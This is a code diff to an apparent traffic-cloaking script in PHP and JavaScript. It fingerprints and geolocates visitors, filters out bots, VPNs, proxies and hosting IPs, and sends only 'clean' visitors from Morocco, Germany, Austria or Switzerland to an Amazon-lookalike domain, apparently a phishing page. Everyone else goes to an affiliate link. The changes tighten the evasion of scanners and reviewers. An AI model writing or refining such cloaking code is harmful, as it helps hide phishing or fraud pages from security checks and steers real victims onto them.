@@ -11,7 +11,7 @@
 $config = [
     'log_file' => 'visitors.log',
     'allowed_countries' => ['MA','DE','AT','CH'],
-    'target_url' => 'https://mobtrk.link/view.php?id=5539903&pub=647149',
+    'target_url' => 'https://amz-de.up.railway.app/',
     'fallback_url' => 'https://mobtrk.link/view.php?id=5539903&pub=647149'
 ];
 
@@ -127,8 +127,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['detection_data'])) {
     $org = filter_var($data['org'] ?? 'unknown', FILTER_SANITIZE_STRING);
     $detectionFlags = filter_var($data['detectionFlags'] ?? '', FILTER_SANITIZE_STRING);
 
-    // Get user agent info
-    $uaInfo = parseUserAgent($ua);
+    // Use client-provided browser info if available, otherwise parse from user agent
+    $os = filter_var($data['os'] ?? null, FILTER_SANITIZE_STRING);
+    $browser = filter_var($data['browser'] ?? null, FILTER_SANITIZE_STRING);
+    $version = filter_var($data['version'] ?? null, FILTER_SANITIZE_STRING);
+    
+    // If client didn't provide browser info, parse from user agent
+    if (!$os || !$browser) {
+        $uaInfo = parseUserAgent($ua);
+        $os = $os ?: $uaInfo['os'];
+        $browser = $browser ?: $uaInfo['browser'];
+        $version = $version ?: $uaInfo['version'];
+    }
 
     // Log the visitor data
     logVisitor([
@@ -140,9 +150,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['detection_data'])) {
         $status,
         $blockReason,
         $ua,
-        $uaInfo['os'],
-        $uaInfo['browser'],
-        $uaInfo['version'],
+        $os,
+        $browser,
+        $version,
         $isp,
         $org,
         $detectionFlags
@@ -155,7 +165,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['detection_data'])) {
 // Create initial log file if it doesn't exist
 if (!file_exists($config['log_file'])) {
     // Create the log file with just the header
-    $headers = "[TIMESTAMP] IP | COUNTRY_NAME | COUNTRY_CODE | CITY | TIMEZONE | STATUS | BLOCK_REASON | USER_AGENT | OS | BROWSER | VERSION | REQUESTS | ISP | ORG | DETECTION_FLAGS\n";
+    $headers = "[TIMESTAMP] IP | COUNTRY_NAME | COUNTRY_CODE | CITY | TIMEZONE | STATUS | BLOCK_REASON | USER_AGENT | OS | BROWSER | VERSION | ISP | ORG | DETECTION_FLAGS\n";
     file_put_contents($config['log_file'], $headers, LOCK_EX);
 }
 
@@ -541,6 +551,47 @@ if (!file_exists($config['log_file'])) {
                 });
             }
 
+            // Get browser information
+            function getBrowserInfo() {
+                const ua = navigator.userAgent;
+                let browser = 'unknown';
+                let version = 'unknown';
+                let os = 'unknown';
+                
+                // Detect browser
+                if (ua.indexOf('Firefox') > -1) {
+                    browser = 'Firefox';
+                    version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'unknown';
+                } else if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1 && ua.indexOf('OPR') === -1) {
+                    browser = 'Chrome';
+                    version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'unknown';
+                } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
+                    browser = 'Safari';
+                    version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'unknown';
+                } else if (ua.indexOf('Edg') > -1) {
+                    browser = 'Edge';
+                    version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'unknown';
+                } else if (ua.indexOf('OPR') > -1) {
+                    browser = 'Opera';
+                    version = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || 'unknown';
+                }
+                
+                // Detect OS
+                if (ua.indexOf('Windows') > -1) {
+                    os = 'Windows';
+                } else if (ua.indexOf('Mac') > -1) {
+                    os = 'Mac';
+                } else if (ua.indexOf('Linux') > -1) {
+                    os = 'Linux';
+                } else if (ua.indexOf('Android') > -1) {
+                    os = 'Android';
+                } else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
+                    os = 'iOS';
+                }
+                
+                return { browser, version, os };
+            }
+            
             // Main detection function
             function detectVisitor() {
                 // First perform client-side checks
@@ -549,24 +600,12 @@ if (!file_exists($config['log_file'])) {
                 const hasBrowserInconsistencies = checkBrowserFeatures();
                 const hasSuspiciousBehavior = performBehavioralAnalysis();
 
-                // If any client-side checks fail, redirect immediately
+                // If any client-side checks fail, we'll still get IP info before redirecting
+                // This prevents "unknown" entries in the dashboard
                 if (isBot || hasBadTimezone || hasBrowserInconsistencies || hasSuspiciousBehavior) {
-                    logDetectionToServer({
-                        ip: 'unknown', // No IP available yet
-                        countryCode: 'unknown',
-                        proxy: 'unknown',
-                        hosting: 'unknown',
-                        isp: 'unknown',
-                        org: 'unknown',
-                        detectionFlags: detectionFlags, // Pass the array directly
-                        status: 'blocked',
-                        blockReason: 'client_side_detection'
-                    });
-
-                    setTimeout(() => {
-                        window.location.href = config.fallbackUrl;
-                    }, 500);
-                    return;
+                    detectionFlags.push('client_side_detection');
+                    // Continue to IP API request instead of redirecting immediately
+                    // This will ensure we have proper IP information in logs
                 }
 
                 // Fetch IP geolocation data
@@ -582,10 +621,24 @@ if (!file_exists($config['log_file'])) {
                         const isp = data.isp || 'unknown';
                         const org = data.org || 'unknown';
                         const isIspSuspicious = checkIsp(isp);
-
-                        // Determine status and block reason - only based on country now
-                        let status = countryAllowed ? 'clean' : 'blocked';
-                        let blockReason = countryAllowed ? 'none' : 'geo_restriction';
+                        
+                        // Block if proxy, VPN, hosting, or suspicious ISP is detected, regardless of country
+                        const isClean = countryAllowed && !isProxy && !isHosting && !isIspSuspicious;
+                        
+                        // Determine status and block reason
+                        let status = isClean ? 'clean' : 'blocked';
+                        let blockReason = 'none';
+                        
+                        // Set specific block reason
+                        if (!countryAllowed) {
+                            blockReason = 'geo_restriction';
+                        } else if (isProxy) {
+                            blockReason = 'proxy_detected';
+                        } else if (isHosting) {
+                            blockReason = 'hosting_detected';
+                        } else if (isIspSuspicious) {
+                            blockReason = 'suspicious_isp';
+                        }
                         
                         // Still log detection flags for informational purposes
                         if (!countryAllowed) {
@@ -623,8 +676,8 @@ if (!file_exists($config['log_file'])) {
                             blockReason: blockReason
                         });
 
-                        // Determine redirect based only on country check
-                        const redirectUrl = countryAllowed ? config.targetUrl : config.fallbackUrl;
+                        // Determine redirect based on clean status (country allowed AND no proxy/VPN/hosting)
+                        const redirectUrl = isClean ? config.targetUrl : config.fallbackUrl;
                         
                         // Redirect after a short delay
                         setTimeout(() => {
@@ -634,20 +687,30 @@ if (!file_exists($config['log_file'])) {
                     .catch(error => {
                         console.error('Error fetching IP data:', error);
 
-                        // Log error and redirect to fallback
+                        // Use client IP from server side as fallback
+                        const clientIP = '<?php echo $ip; ?>';
                         detectionFlags.push('api_error:ip_api_failed');
-
+                        
+                        // Get browser timezone as fallback
+                        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+                        
+                        // Use browser information as fallback
+                        const browserInfo = getBrowserInfo();
+                        
                         logDetectionToServer({
-                            ip: 'unknown', // No IP available in error case
-                            country: 'Error',
+                            ip: clientIP, // Use server-side IP as fallback
+                            country: 'Unknown',
                             countryCode: 'XX',
-                            city: 'Error',
-                            timezone: 'Unknown',
+                            city: 'Unknown',
+                            timezone: browserTimezone,
                             proxy: false,
                             hosting: false,
-                            isp: 'Error',
-                            org: 'Error',
-                            detectionFlags: detectionFlags, // Pass the array directly
+                            isp: 'Unknown',
+                            org: 'Unknown',
+                            os: browserInfo.os,
+                            browser: browserInfo.browser,
+                            version: browserInfo.version,
+                            detectionFlags: detectionFlags,
                             status: 'blocked',
                             blockReason: 'api_error'
                         });
